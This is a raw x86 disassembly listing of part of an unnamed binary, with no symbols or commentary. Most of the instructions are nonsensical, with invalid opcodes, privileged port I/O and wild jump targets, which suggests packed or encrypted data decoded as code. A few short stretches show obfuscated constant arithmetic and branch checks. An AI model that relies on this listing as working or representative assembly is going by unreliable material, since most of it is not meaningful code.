  411873:	stos   DWORD PTR es:[edi],eax
  411874:	scas   eax,DWORD PTR es:[edi]
  411875:	mov    ah,0x27
  411877:	jl     0x411811
  411879:	mov    ds:0xc407ca19,eax
  41187e:	push   ss
  41187f:	xchg   ecx,eax
  411880:	pop    ebx
  411881:	jbe    0x41182c
  411883:	lahf   
  411884:	mov    bh,0x7a
  411886:	cmp    al,0xad
  411888:	test   eax,0xc33a3806
  41188d:	add    ebx,ebx
  41188f:	adc    dl,BYTE PTR [ebx-0x1f39d38d]
  411895:	mov    eax,0xf736eaff
  41189a:	test   eax,0xdead59fd
  41189f:	dec    ebx
  4118a0:	inc    edx
  4118a1:	cld    
  4118a2:	adc    al,0x99
  4118a4:	adc    BYTE PTR [edi+ecx*2],al
  4118a7:	(bad)  
  4118a8:	mov    bh,0xc9
  4118aa:	iret   
  4118ab:	mov    bl,BYTE PTR [eax+0x61dc04a8]
  4118b1:	call   0x3159e0bc
  4118b6:	sbb    DWORD PTR [esi+0x37744493],eax
  4118bc:	out    0x76,al
  4118be:	cs in  al,dx
  4118c0:	add    eax,0x52836b2c
  4118c5:	rep outs dx,DWORD PTR ds:[esi]
  4118c7:	out    0xe,eax
  4118c9:	rol    DWORD PTR [edx+0x69],cl
  4118cc:	test   DWORD PTR [ebp+0x1],eax
  4118cf:	fst    DWORD PTR [edx-0x4a]
  4118d2:	clc    
  4118d3:	cli    
  4118d4:	into   
  4118d5:	add    BYTE PTR [eax-0x9915226],cl
  4118db:	push   0xffffffdc
  4118dd:	loope  0x411935
  4118df:	pop    es
  4118e0:	inc    ebx
  4118e1:	(bad)  
  4118e2:	in     al,dx
  4118e3:	mov    ebx,esp
  4118e5:	xchg   edx,esp
  4118e7:	mov    eax,ds:0x2f7a20c0
  4118ec:	inc    ebp
  4118ed:	mov    esp,0x1a95186f
  4118f2:	repz mov al,ds:0xd4299f38
  4118f8:	push   es
  4118f9:	mov    dl,0xb6
  4118fb:	(bad)  
  4118fc:	hlt    
  4118fd:	and    al,0x72
  4118ff:	fsubr  QWORD PTR [edx+0x25]
  411902:	mov    ecx,0x7bd51fb7
  411907:	je     0x41197d
  411909:	fsub   st,st(6)
  41190b:	imul   edx,DWORD PTR [esi],0xffffffd6
  41190e:	jae    0x411976
  411910:	call   0xa589d842
  411915:	(bad)  
  411916:	mov    DWORD PTR [edx+ebx*4],esi
  411919:	inc    edi
  41191a:	fnsave ds:0x89264979
  411920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411921:	dec    esi
  411922:	or     cl,BYTE PTR [ecx]
  411924:	adc    al,0xfd
  411926:	popa   
  411927:	shr    DWORD PTR [edi+0x3],0xa5
  41192b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192c:	xchg   ebx,eax
  41192d:	add    al,0x43
  41192f:	mov    eax,DWORD PTR [eax]
  411931:	push   cs
  411932:	dec    ebx
  411933:	cmc    
  411934:	or     BYTE PTR [eax-0x155e9e9b],al
  41193a:	jmp    0x988d:0x668919aa
  411941:	cmc    
  411942:	mov    WORD PTR [eax-0x3e945b0a],?
  411948:	adc    BYTE PTR [ebx+0x203e7c09],0xf2
  41194f:	mov    edx,0x384c6188
  411954:	push   eax
  411955:	(bad)  
  411956:	inc    BYTE PTR [ecx+0x13]
  411959:	es xchg esp,eax
  41195b:	int3   
  41195c:	fmulp  st(3),st
  41195e:	(bad)  
  41195f:	and    ecx,DWORD PTR [edi+0x6ba06a35]
  411965:	inc    edx
  411966:	inc    edi
  411967:	arpl   WORD PTR [ebp+0x73958c25],di
  41196d:	sbb    ebp,DWORD PTR [esi+0x6372de3c]
  411973:	(bad)  
  411974:	int3   
  411975:	fs inc ebp
  411977:	inc    ecx
  411978:	imul   ecx,DWORD PTR [esi+0x56],0x2f
  41197c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41197d:	pop    ss
  41197e:	cmp    DWORD PTR [esi],0x2
  411981:	dec    edx
  411982:	leave  
  411983:	aad    0x74
  411985:	inc    edx
  411986:	xchg   edi,eax
  411987:	into   
  411988:	add    cl,bl
  41198a:	mov    ds:0x4f7c57b9,al
  41198f:	inc    ebp
  411990:	mov    al,0xfd
  411992:	imul   edx,DWORD PTR [edx],0xffffffec
  411995:	in     al,dx
  411996:	scas   al,BYTE PTR es:[edi]
  411997:	jge    0x411962
  411999:	aad    0x4
  41199b:	out    dx,eax
  41199c:	xor    ah,BYTE PTR [edi]
  41199e:	or     al,0xd2
  4119a0:	mov    edi,0xaae20a2f
  4119a5:	fld1   
  4119a7:	sbb    al,0x21
  4119a9:	fiadd  DWORD PTR [esi]
  4119ab:	inc    ecx
  4119ac:	push   DWORD PTR [ebx]
  4119ae:	mov    ds:0xa2a17fb4,eax
  4119b3:	lds    ebp,FWORD PTR [esi]
  4119b5:	mov    cl,0xcb
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422518
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0xb0b1f5d1
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	mov    eax,ds:0xfa31706c
  411a19:	jbe    0x411a18
  411a1b:	rcl    ebx,1
  411a1d:	jae    0x411a11
  411a1f:	inc    edx
  411a20:	sbb    BYTE PTR [ebx+0x4c],ch
  411a23:	lods   eax,DWORD PTR ds:[esi]
  411a24:	dec    esp
  411a25:	lods   al,BYTE PTR ds:[esi]
  411a26:	mov    edx,?
  411a28:	outs   dx,BYTE PTR ds:[esi]
  411a29:	lods   eax,DWORD PTR ds:[esi]
  411a2a:	leave  
  411a2b:	inc    ebx
  411a2c:	sahf   
  411a2d:	inc    ecx
  411a2e:	loop   0x4119c6
  411a30:	and    eax,esp
  411a32:	hlt    
  411a33:	popf   
  411a34:	popf   
  411a35:	adc    BYTE PTR [eax-0x64],ch
  411a38:	jae    0x4119cd
  411a3a:	lahf   
  411a3b:	mov    al,ds:0x1e2bfd2
  411a40:	jae    0x411a9d
  411a42:	xor    BYTE PTR [ebx-0x4c622f54],ch
  411a48:	xor    edi,DWORD PTR [edx+0x33]
  411a4b:	fnsave [ebx+0x4a0f08c3]
  411a51:	jp     0x411ac2
  411a53:	pop    ebx
  411a54:	(bad)  
  411a56:	mov    DWORD PTR ds:0x99cb4c6c,esi
  411a5c:	push   ecx
  411a5d:	add    ebp,ecx
  411a5f:	out    dx,al
  411a60:	sub    al,0xca
  411a62:	pop    ds
  411a63:	js     0x411a02
  411a65:	mov    bx,0x4dc9
  411a69:	mov    dh,0x21
  411a6b:	pop    esp
  411a6c:	push   ecx
  411a6d:	inc    ebx
  411a6e:	call   0x966f490f
  411a73:	dec    edi
  411a74:	jl     0x4119fb
  411a76:	cmp    ch,BYTE PTR [edx-0x49d59bd7]
  411a7c:	aaa    
  411a7d:	(bad)  
  411a7f:	adc    ebx,edx
  411a81:	push   edi
  411a82:	mov    ebp,DWORD PTR [ecx]
  411a84:	xor    eax,0xb3acb090
  411a89:	imul   esp,DWORD PTR [esi],0xb97495df
  411a8f:	dec    ebp
  411a90:	repz push esp
  411a92:	mov    al,0xc4
  411a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a95:	inc    esp
  411a96:	nop
  411a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a98:	pop    ds
  411a99:	sti    
  411a9a:	lea    eax,[eax+0x33]
  411a9d:	mov    dl,0xcb
  411a9f:	outs   dx,DWORD PTR ds:[esi]
  411aa0:	mov    esp,0x14b635c0
  411aa5:	mov    ?,WORD PTR [ebx]
  411aa7:	in     eax,dx
  411aa8:	mov    dh,0x7a
  411aaa:	jp     0x411ac4
  411aac:	sub    BYTE PTR [edi-0x5a],bl
  411aaf:	mov    dh,0x5b
  411ab1:	and    dl,BYTE PTR [ebp-0x3fefef1f]
  411ab7:	inc    esi
  411ab8:	adc    esi,DWORD PTR [esi+0x3219fd97]
  411abe:	pop    esi
  411abf:	push   esp
  411ac0:	rol    DWORD PTR [edi+0x1a],cl
  411ac3:	pop    esi
  411ac4:	jbe    0x411b15
  411ac6:	push   eax
  411ac7:	sub    DWORD PTR [edx+ebp*4-0x80],eax
  411acb:	cli    
  411acc:	pop    es
  411acd:	xchg   al,ah
  411acf:	pop    eax
  411ad0:	cmp    edx,DWORD PTR [ecx+0x17]
  411ad3:	mov    WORD PTR [ebp+0x75e7d93],fs
  411ad9:	leave  
  411ada:	inc    esi
  411adb:	cld    
  411adc:	or     eax,DWORD PTR [ebx]
  411ade:	jbe    0x411ad5
  411ae0:	std    
  411ae1:	aaa    
  411ae2:	cmp    ah,BYTE PTR [eax]
  411ae4:	dec    esp
  411ae5:	cmc    
  411ae6:	mov    eax,DWORD PTR ds:0x9ff8ef2
  411aec:	or     al,0xaa
  411aee:	sar    ah,cl
  411af0:	lods   al,BYTE PTR ds:[esi]
  411af1:	jnp    0x411b06
  411af3:	inc    esp
  411af4:	push   edx
  411af5:	mov    cl,0x8a
  411af7:	je     0x411adf
  411af9:	add    al,0x33
  411afb:	(bad)  
  411afc:	pop    ss
  411afd:	mov    gs,esp
  411aff:	sub    bh,BYTE PTR [esi+edi*8-0x2068b35]
  411b06:	jle    0x411b49
  411b08:	mov    ds:0xdfc14bd,al
  411b0d:	sahf   
  411b0e:	cmc    
  411b0f:	pop    edi
  411b10:	or     al,bl
  411b12:	call   FWORD PTR [ebp-0x5d]
  411b15:	mov    bh,BYTE PTR [edi-0x7996ddd5]
  411b1b:	sub    al,0x28
  411b1d:	and    cl,BYTE PTR ds:[ebx-0x5944381c]
  411b24:	in     eax,dx
  411b25:	push   esi
  411b26:	int    0x5b
  411b28:	in     eax,dx
  411b29:	bnd cs jne 0x411b92
  411b2d:	fs stos DWORD PTR es:[edi],eax
  411b2f:	or     eax,0x9b11f15c
  411b34:	and    al,0xdc
  411b36:	aam    0xc3
  411b38:	out    dx,al
  411b39:	jb     0x411b7c
  411b3b:	(bad)  
  411b3c:	xor    DWORD PTR cs:[ecx-0x3d],edi
  411b40:	dec    esp
  411b41:	push   ss
  411b42:	ja     0x411b17
  411b44:	fwait
  411b45:	cmp    esp,DWORD PTR ds:0xf1f5fd30
  411b4b:	mov    ch,0xb1
  411b4d:	lods   eax,DWORD PTR ds:[esi]
  411b4e:	data16 xchg BYTE PTR [edx+edx*4],bh
  411b52:	cwde   
  411b53:	pop    es
  411b54:	dec    BYTE PTR [edx-0x2c]
  411b57:	lea    ebx,[ecx-0x16b19cfd]
  411b5d:	dec    edx
  411b5e:	das    
  411b5f:	shl    esp,1
  411b61:	out    dx,eax
  411b62:	cmp    eax,0xfc85bf2c
  411b67:	mov    ebp,0x50a22853
  411b6c:	xor    ecx,eax
  411b6e:	xor    DWORD PTR [edi-0x3048da7e],0xffffffa1
  411b75:	cmp    DWORD PTR [edi-0x42],ecx
  411b78:	push   edx
  411b79:	add    bl,bh
  411b7b:	call   0x2ad794f8
  411b80:	(bad)  [ebx+0x7558140b]
  411b86:	out    0x44,al
  411b88:	ret    
  411b89:	and    ch,BYTE PTR [edi+eiz*4+0x29]
  411b8d:	sub    DWORD PTR [ecx-0x7e],ecx
  411b90:	xchg   esp,eax
  411b91:	sbb    ebx,DWORD PTR [eax-0x14]
  411b94:	retf   0x9aea
  411b97:	call   0xd29e:0x55e94620
  411b9e:	xchg   DWORD PTR [eax],esp
  411ba0:	inc    ebp
  411ba1:	cdq    
  411ba2:	sub    al,0xbd
  411ba4:	inc    esp
  411ba5:	and    ch,BYTE PTR [ebx+edx*8+0x7e4bb6c4]
  411bac:	cli    
  411bad:	dec    esp
  411bae:	out    dx,al
  411baf:	mov    eax,ds:0xe76e7ce4
  411bb4:	cmp    esi,DWORD PTR [ebp-0x1c]
  411bb7:	arpl   WORD PTR [edx],di
  411bb9:	call   0xd15f:0x654b656d
  411bc0:	add    edi,eax
  411bc2:	ja     0x411c3b
  411bc4:	mov    dl,BYTE PTR [eax+edx*1+0x26b7169]
  411bcb:	loop   0x411bfc
  411bcd:	dec    ebx
  411bce:	pop    esp
  411bcf:	mov    ds:0xc129ad33,eax
  411bd4:	adc    BYTE PTR [ecx+ecx*4-0x4a],ah
  411bd8:	or     DWORD PTR [ebp+0x7e51b7ff],ecx
  411bde:	mov    ds:0x16e5f498,al
  411be3:	jnp    0x411b98
  411be5:	stos   DWORD PTR es:[edi],eax
  411be6:	xor    dh,BYTE PTR [edi]
  411be8:	(bad)  
  411be9:	leave  
  411bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411beb:	mov    cl,0xa6
  411bed:	call   FWORD PTR [edx-0x56]
  411bf0:	xor    bl,0x34
  411bf3:	or     BYTE PTR [eax+0x1a8541eb],0xf3
  411bfa:	lds    eax,FWORD PTR [eax+ecx*2]
  411bfd:	fnstsw WORD PTR [edi+esi*1+0x20]
  411c01:	(bad)  
  411c02:	icebp  
  411c03:	aas    
  411c04:	inc    edx
  411c05:	pop    ecx
  411c06:	mov    al,0xdb
  411c08:	shl    DWORD PTR [edi+0x5db63886],1
  411c0e:	test   DWORD PTR [ecx+0x7c4a0f45],edx
  411c14:	push   ebx
  411c15:	adc    edi,edi
  411c17:	mov    ebx,0x7af09fa1
  411c1c:	mov    ebx,0x6c995b3d
  411c21:	or     esp,ebx
  411c23:	and    ebp,edx
  411c25:	adc    dh,cl
  411c27:	outs   dx,DWORD PTR ds:[esi]
  411c28:	push   ss
  411c29:	mov    edx,0xa185b5d3
  411c2e:	sti    
  411c2f:	add    al,0x93
  411c31:	(bad)  
  411c32:	outs   dx,DWORD PTR ds:[esi]
  411c33:	add    eax,0x673582f3
  411c38:	(bad)  
  411c39:	icebp  
  411c3a:	iret   
  411c3b:	fisubr DWORD PTR [ebp+0x1a]
  411c3e:	push   esi
  411c3f:	pop    edi
  411c40:	gs sub al,0xa4
  411c43:	fidivr WORD PTR [ecx]
  411c45:	call   0x72451208
  411c4a:	add    al,bl
  411c4c:	xchg   ecx,eax
  411c4d:	int3   
  411c4e:	xchg   esi,eax
  411c4f:	cmp    DWORD PTR [esi+0x173accc5],0xcc88275d
  411c59:	stos   BYTE PTR es:[edi],al
  411c5a:	xlat   BYTE PTR ds:[ebx]
  411c5b:	add    eax,0x6cbb419f
  411c60:	mov    al,0x25
  411c62:	lea    edx,[edx-0x3559baeb]
  411c68:	scas   al,BYTE PTR es:[edi]
  411c69:	mov    ebx,eax
  411c6b:	lahf   
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x1e0a6a08]
  411c98:	pop    ebp
  411c99:	jo     0x411cea
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	mov    dh,0x45
  411ca4:	pop    ds
  411ca5:	cmp    DWORD PTR cs:[esi-0x2],edx
  411ca9:	dec    ebx
  411caa:	fs test eax,0xcaddf3ed
  411cb0:	push   ss
  411cb1:	int    0xf0
  411cb3:	mov    bl,BYTE PTR [ebp-0x78]
  411cb6:	ins    BYTE PTR es:[edi],dx
  411cb7:	jo     0x411c99
  411cb9:	cld    
  411cba:	jae    0x411c4d
  411cbc:	mov    eax,ds:0x1ec72470
  411cc1:	ds add al,0x52
  411cc4:	int    0xbf
  411cc6:	ins    BYTE PTR es:[edi],dx
  411cc7:	add    eax,0x47ea6eda
  411ccc:	or     al,0xde
  411cce:	in     al,0xbe
  411cd0:	int    0xa1
  411cd2:	dec    edi
  411cd3:	xor    ebx,ebx
  411cd5:	xchg   DWORD PTR [ebx],edx
  411cd7:	mov    ?,eax
  411cd9:	lods   al,BYTE PTR ds:[esi]
  411cda:	aad    0xb5
  411cdc:	sti    
  411cdd:	iret   
  411cde:	hlt    
  411cdf:	imul   esp,DWORD PTR [ecx+0x6c],0x4e
  411ce3:	cli    
  411ce4:	dec    esp
  411ce5:	dec    ebx
  411ce6:	adc    al,0x22
  411ce8:	and    al,0xe7
  411cea:	outs   dx,DWORD PTR ds:[esi]
  411cec:	mov    esi,0xbb9a1523
  411cf1:	push   esi
  411cf2:	jle    0x411ca1
  411cf4:	popf   
  411cf5:	mov    edi,DWORD PTR [ecx+0x3d8f73df]
  411cfb:	mov    ecx,DWORD PTR [eax+0x5d8568f3]
  411d01:	call   0xcd56:0x88d53baf
  411d08:	js     0x411d7b
  411d0a:	mov    cl,0x8
  411d0c:	stos   DWORD PTR es:[edi],eax
  411d0d:	scas   eax,DWORD PTR es:[edi]
  411d0e:	jmp    0xebe8c1f2
  411d13:	aas    
  411d14:	cmp    BYTE PTR [ebx],bh
  411d16:	xchg   esp,eax
  411d17:	shl    BYTE PTR [ecx],cl
  411d19:	cdq    
  411d1a:	out    dx,eax
  411d1b:	dec    ecx
  411d1c:	cli    
  411d1d:	jl     0x411d85
  411d1f:	imul   edx,DWORD PTR [edi],0x27b2b9dc
  411d25:	jmp    0x89baeb6c
  411d2a:	(bad)  
  411d2c:	or     DWORD PTR [esi-0x1a],ebp
  411d2f:	shr    DWORD PTR [ecx+edx*4+0x797d0ea6],1
  411d36:	jp     0x411d9d
  411d38:	jae    0x411cd8
  411d3a:	mov    al,0x49
  411d3c:	test   al,0x48
  411d3e:	imul   ebx,ebp,0x29
  411d41:	nop
  411d42:	scas   eax,DWORD PTR es:[edi]
  411d43:	pop    esp
  411d44:	jbe    0x411d91
  411d46:	push   edx
  411d47:	and    al,0x97
  411d49:	and    al,0xc
  411d4b:	pop    es
  411d4c:	mov    ?,WORD PTR [ebx+eiz*8]
  411d4f:	stc    
  411d50:	xchg   bl,cl
  411d52:	mov    eax,0xcf4af863
  411d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d58:	adc    BYTE PTR [esp+edi*4],0xda
  411d5c:	mov    edi,0x8ad600b9
  411d61:	jg     0x411da0
  411d63:	iret   
  411d64:	nop
  411d65:	xchg   ebp,eax
  411d66:	fucomip st,st(3)
  411d68:	or     DWORD PTR [ecx],esi
  411d6a:	in     al,dx
  411d6b:	iret   
  411d6c:	and    ecx,DWORD PTR [ecx]
  411d6e:	mov    bh,BYTE PTR [ebx]
  411d70:	inc    esi
  411d72:	jmp    0x446344
  411d77:	or     DWORD PTR [eax],0xffffffe3
  411d7a:	fwait
  411d7b:	xchg   esi,eax
  411d7c:	pop    ss
  411d7d:	push   eax
  411d7e:	pop    ebp
  411d7f:	inc    ebx
  411d80:	mov    esp,ds
  411d82:	sti    
  411d83:	inc    edi
  411d84:	mov    ch,0x28
  411d86:	in     al,0xf7
  411d88:	mov    ah,BYTE PTR [edx+0x13b3ad1f]
  411d8e:	pop    es
  411d8f:	mov    ds:0x7a2bb4ea,al
  411d94:	cld    
  411d95:	aad    0xa0
  411d97:	sub    dh,dl
  411d99:	and    eax,0x7d489314
  411d9e:	mov    ds:0xa319d303,eax
  411da3:	jmp    0x241ec81e
  411da8:	mov    esp,0xbb98d2ef
  411dad:	or     bl,bh
  411daf:	int    0xd1
  411db1:	mov    bl,0xb7
  411db3:	fstp   TBYTE PTR [edi-0x59e108b4]
  411db9:	xor    DWORD PTR [ebp-0x65],ecx
  411dbc:	sbb    al,0x94
  411dbe:	dec    ecx
  411dbf:	sti    
  411dc0:	stos   DWORD PTR es:[edi],eax
  411dc1:	inc    ecx
  411dc2:	jno    0x411e34
  411dc4:	push   ss
  411dc5:	aaa    
  411dc6:	sbb    eax,0x4d72ca09
  411dcb:	inc    eax
  411dcc:	call   0x33e01b56
  411dd1:	sub    BYTE PTR [eax+0x1e],dl
  411dd4:	mov    ds:0xdb1fa5e,eax
  411dd9:	pop    ebp
  411dda:	push   es
  411ddb:	push   ebx
  411ddc:	xor    bh,al
  411dde:	(bad)  
  411ddf:	popa   
  411de0:	test   DWORD PTR ds:0xb55171c7,ecx
  411de6:	test   ch,bl
  411de8:	pop    edx
  411de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dea:	scas   eax,DWORD PTR es:[edi]
  411deb:	das    
  411dec:	mov    al,0xba
  411dee:	jno    0x411e06
  411df0:	adc    eax,0xd6314c72
  411df5:	push   es
  411df6:	add    bl,dh
  411df8:	jne    0x411e6d
  411dfa:	jae    0x411e68
  411dfc:	mov    al,ds:0x44f537a8
  411e01:	push   0x3438e864
  411e06:	adc    cl,BYTE PTR [esi-0x292e776d]
  411e0c:	je     0x411ddc
  411e0e:	in     eax,dx
  411e0f:	or     al,0x95
  411e11:	and    edi,edi
  411e13:	jge    0x411dca
  411e15:	cs (bad) 
  411e18:	fstp   DWORD PTR [edi-0x74]
  411e1b:	iret   
  411e1c:	mov    eax,0x907893d3
  411e21:	inc    edi
  411e22:	fcomp  st(4)
  411e24:	adc    ah,BYTE PTR [ecx]
  411e26:	dec    eax
  411e27:	call   DWORD PTR ds:0x8386ea28
  411e2d:	pop    esi
  411e2e:	push   0xffffffae
  411e30:	push   ebp
  411e31:	sbb    al,0xac
  411e33:	or     eax,0xf2fc5d02
  411e38:	dec    esi
  411e39:	call   ebx
  411e3b:	mov    al,ds:0x95c8d543
  411e40:	ret    0x4883
  411e43:	dec    ebp
  411e44:	nop
  411e45:	and    al,0xdb
  411e47:	or     al,0x1c
  411e49:	pop    eax
  411e4a:	cdq    
  411e4b:	push   ss
  411e4c:	(bad)  
  411e4d:	cmp    al,0xac
  411e4f:	pop    ebx
  411e50:	daa    
  411e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e52:	push   ds
  411e53:	hlt    
  411e54:	pop    ebp
  411e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e56:	and    ax,0xb8c2
  411e5a:	jmp    0x411e8b
  411e5c:	pop    ds
  411e5d:	sar    BYTE PTR [edx+eiz*4+0x3267c36],1
  411e64:	push   es
  411e65:	jbe    0x411e0f
  411e67:	stc    
  411e68:	addr16 mov ds:0xe308,al
  411e6c:	jp     0x411e7f
  411e6e:	lods   al,BYTE PTR ds:[esi]
  411e6f:	mov    fs,ebp
  411e71:	arpl   WORD PTR [eax+0x50],di
  411e74:	stc    
  411e75:	xor    eax,0x3b329af3
  411e7a:	mov    bl,0xcb
  411e7c:	jmp    0x411eeb
  411e7e:	(bad)  
  411e80:	or     eax,eax
  411e82:	in     eax,0x54
  411e84:	out    dx,al
  411e85:	clc    
  411e86:	sbb    al,0x91
  411e88:	aad    0x87
  411e8a:	push   ss
  411e8b:	pop    ds
  411e8c:	cmp    DWORD PTR [edx+0x5f],edi
  411e8f:	adc    BYTE PTR [ebx],ch
  411e91:	xchg   edx,eax
  411e92:	scas   eax,DWORD PTR es:[edi]
  411e93:	sub    DWORD PTR [ebp+0x70],ebp
  411e96:	or     BYTE PTR [bp+di],0x8f
  411e9a:	loop   0x411e57
  411e9c:	inc    esi
  411e9d:	cwde   
  411e9e:	adc    eax,0x10e9c2a2
  411ea3:	loop   0x411f20
  411ea5:	cmp    ah,BYTE PTR [esp+eax*2-0x40fab216]
  411eac:	add    eax,0x3a55c62b
  411eb1:	nop
  411eb2:	(bad)  
  411eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb4:	(bad)  
  411eb5:	xor    dh,BYTE PTR [esi+esi*4-0x23de622a]
  411ebc:	ss call 0x66e3b355
  411ec2:	pop    ss
  411ec3:	repz pop esi
  411ec5:	add    eax,0x860efbcf
  411eca:	push   ebx
  411ecb:	jae    0x411ead
  411ecd:	les    esi,FWORD PTR [eax+ebp*4]
  411ed0:	clc    
  411ed1:	mov    ah,0x84
  411ed3:	xor    eax,0x1915556c
  411ed8:	loope  0x411e7f
  411eda:	or     DWORD PTR [ebx],ebp
  411edc:	add    cl,BYTE PTR [ebx]
  411ede:	dec    edi
  411edf:	aam    0xd2
  411ee1:	out    dx,al
  411ee2:	sub    DWORD PTR [esp+ecx*1-0x6d9ade81],eax
  411ee9:	dec    eax
  411eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eeb:	outs   dx,BYTE PTR ds:[esi]
  411eec:	and    ch,BYTE PTR [ecx+ebx*2-0x35]
  411ef0:	jno    0x411e79
  411ef2:	dec    esi
  411ef3:	pop    ds
  411ef4:	repnz mov dl,0x47
  411ef7:	sbb    DWORD PTR ds:0x8bce0b88,ecx
  411efd:	jne    0x411e93
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422518
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225b4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225ac,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	sub    esp,DWORD PTR [edi-0x4d]
  411fac:	jl     0x411f54
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	aaa    
  411fb6:	and    al,BYTE PTR [edx-0x34e57120]
  411fbc:	push   edi
  411fbd:	cwde   
  411fbe:	cmp    eax,0x22dfe130
  411fc3:	mov    esi,DWORD PTR [bx+si-0x54]
  411fc7:	clc    
  411fc8:	cld    
  411fc9:	cmp    al,0x8a
  411fcb:	cmp    eax,DWORD PTR [edx-0x1a]
  411fce:	retf   0x8838
  411fd1:	in     eax,dx
  411fd2:	bound  edi,QWORD PTR [eax+edi*4-0x25b2ccf2]
  411fd9:	cmp    esi,DWORD PTR [ecx-0x32080667]
  411fdf:	dec    eax
  411fe0:	jo     0x41203e
  411fe2:	pop    ecx
  411fe3:	arpl   WORD PTR [edx-0xf],di
  411fe6:	inc    ecx
  411fe7:	inc    edi
  411fe8:	ret    
  411fe9:	xchg   ebx,eax
  411fea:	shr    BYTE PTR [ebp-0x71],cl
  411fed:	add    edx,DWORD PTR [eax+0xf]
  411ff0:	or     cl,BYTE PTR [ecx+eiz*2+0x5fb38c4a]
  411ff7:	mov    eax,0x8396aa85
  411ffc:	mov    ds:0xfdd4146a,al
  412001:	dec    edx
  412002:	sub    ah,BYTE PTR [ecx]
  412004:	nop
  412005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412006:	int    0x79
  412008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412009:	jne    0x411fe2
  41200b:	mov    edx,0xa043e033
  412010:	retf   0x5a27
  412013:	leave  
  412014:	pop    ds
  412015:	fild   WORD PTR [esi+edx*4+0x1927d125]
  41201c:	dec    eax
  41201d:	sub    DWORD PTR [edx],0x73
  412020:	sub    eax,0xb0512e12
  412025:	sbb    eax,0x9bc724b0
  41202a:	xor    DWORD PTR [ebx+ebx*8+0x64],eax
  41202e:	fnstcw WORD PTR [esi+0x28]
  412031:	ds pushf 
  412033:	xor    eax,0x20f30c10
  412038:	sbb    al,0xcf
  41203a:	nop
  41203b:	or     DWORD PTR [edi],0x94afa643
  412041:	add    eax,0x37581f6a
